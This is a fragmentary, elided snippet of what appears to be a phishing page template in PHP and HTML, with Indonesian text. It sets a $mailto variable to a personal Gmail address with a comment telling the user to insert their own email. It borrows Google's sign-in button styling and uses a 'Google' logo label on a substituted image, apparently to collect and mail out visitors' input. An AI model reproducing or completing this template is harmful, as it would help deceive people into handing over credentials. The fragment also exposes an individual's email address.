...
$mailto = 'Sahrulromadhona.s@gmail.com'; //masukin email lo disini,
...
<body>
  ...
  <title>satu langkah membantu kami</title>
...
<style media="screen and (max-width: 800px), screen and (max-height: 800px)">
  ...
  <img alt="Google" class="logo" src="https://cdn0.iconfinder.com/data/icons/flat-round-system/512/archlinux-512.png">
  </div>
  </div>
...
<center><span class="input-group-addon"><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a5/Archlinux-icon-crystal-64.svg/1200px-Archlinux-icon-crystal-64.svg.png"style="width:20px;height:21px;"></span>
<center><p>Terima Kasih telah membantu kami dalam hal sekecil apapun, semoga bermanfaat untuk ke depan.</p></center>
...
<center><p>Sekali lagi kami ucapkan banyak terima kasih.</p></center>
<input id="signIn" name="signIn" class="rc-button rc-button-submit" type="submit" value="Selanjutnya">
